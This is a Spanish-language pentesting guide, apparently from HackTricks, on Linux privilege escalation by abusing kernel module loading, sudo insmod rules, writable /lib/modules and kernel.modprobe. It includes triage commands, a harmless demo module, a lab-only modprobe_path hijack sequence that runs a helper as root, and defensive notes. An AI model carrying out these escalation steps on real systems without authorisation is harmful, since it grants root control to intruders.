# Abuso de Kernel Modules y modprobe

{{#include ../../banners/hacktricks-training.md}}

## Misconfiguraciones de Kernel modules y carga de módulos

El soporte para Kernel modules es un área de alto impacto durante la revisión de privilege escalation en Linux. No consideres cada mensaje sobre módulos sin firma como explotable por sí mismo, sino úsalo para responder preguntas prácticas:

- ¿Puede el usuario actual cargar módulos mediante `sudo`, capabilities o un helper path escribible?
- ¿La carga de módulos sigue habilitada?
- ¿La aplicación de firmas de módulos está deshabilitada?
- ¿Los directorios de módulos o los archivos de módulos son escribibles?
- ¿Se pueden leer los logs del kernel para confirmar lo ocurrido?

Triaje rápido:
```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
cat /proc/sys/kernel/module_sig_enforce 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```
Interpretación:

- `modules_disabled=1` significa que no se pueden cargar módulos nuevos hasta reiniciar.
- `module_sig_enforce=1` normalmente bloquea los módulos sin firmar.
- `dmesg_restrict=0` permite que los usuarios sin privilegios lean los logs del kernel en muchos sistemas.
- Las rutas con permisos de escritura bajo `/lib/modules/$(uname -r)/` son peligrosas porque la detección y la carga automática de módulos pueden confiar en ese árbol.

### Cargar un módulo y leer la salida del kernel

Si tienes permisos legítimos para cargar un módulo local, `insmod` inserta el archivo `.ko` exacto que proporciones. La función init del módulo se ejecuta inmediatamente, y los mensajes escritos con `printk()` aparecen en los logs del kernel.

Flujo de trabajo mínimo para entornos de revisión o laboratorio:
```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```
Si `sudo -l` permite ejecutar `insmod`, `modprobe` o un wrapper que los utilice, considéralo crítico:
```bash
sudo -l
sudo /sbin/insmod ./example.ko
```
### `insmod` permitido mediante Sudo

Una regla de sudo que permite a un usuario ejecutar `insmod` no es comparable con permitir un auxiliar administrativo normal. El código de inicialización del módulo se ejecuta en el contexto del kernel en cuanto se inserta el archivo `.ko`, por lo que la pregunta práctica durante la revisión es: "¿puede este usuario elegir o modificar el módulo que se va a cargar?"

Flujo de revisión genérico:
```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```
Si el usuario puede proporcionar un `.ko` arbitrario, la regla debe tratarse como un compromiso total del sistema en una evaluación autorizada. Un patrón operativo más seguro consiste en evitar delegar la carga de módulos mediante sudo; si es inevitable, restrinja la ruta exacta, la propiedad, los permisos, la política de firma y el flujo de trabajo de eliminación.

Para un patrón inofensivo de compilación de módulos en un laboratorio controlado, un código fuente mínimo y un Makefile tienen este aspecto:
```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
printk(KERN_INFO "demo module loaded\n");
return 0;
}

static void __exit demo_exit(void) {
printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
Construye y carga únicamente en un laboratorio autorizado:
```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```
### Comprobaciones de abuso de `kernel.modprobe` / `modprobe_path`

`kernel.modprobe` controla el helper de userspace que invoca el kernel cuando necesita asistencia para cargar módulos. Si un atacante puede cambiarlo a una ruta de ejecutable con permisos de escritura y activar un formato binario desconocido u otra ruta de solicitud de módulos, puede convertirse en una vía para la ejecución de código como root.

Comprueba el helper actual:
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```
Comprueba si puedes influir en ello:
```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```
Patrón genérico solo para laboratorio:
```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger an unknown executable format so the kernel attempts helper logic
printf '\\xff\\xff\\xff\\xff' > /tmp/unknown
chmod +x /tmp/unknown
/tmp/unknown 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```
En sistemas reforzados, esto debería fallar porque los usuarios sin privilegios no pueden escribir en `kernel.modprobe`, la ruta del helper no es escribible o las rutas de carga de módulos están bloqueadas.

### Revisión de `/lib/modules` escribible

Los directorios de módulos escribibles pueden permitir el reemplazo de módulos, la colocación de módulos maliciosos o el abuso de auto-load, dependiendo de cómo se invoque posteriormente `modprobe`.

Revisa las ubicaciones escribibles:
```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```
Si encuentras contenido de módulos con permisos de escritura, comprueba cómo se descubren los módulos:
```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```
Notas defensivas:

- Mantén `/lib/modules` propiedad de `root:root` y no escribible por los usuarios.
- Establece `kernel.modules_disabled=1` después del arranque cuando sea operativamente posible.
- Aplica la firma de módulos en los sistemas que requieran módulos cargables.
- Supervisa las escrituras en `/proc/sys/kernel/modprobe`, `/lib/modules` y la ejecución inesperada de `insmod`/`modprobe`.

{{#include ../../banners/hacktricks-training.md}}
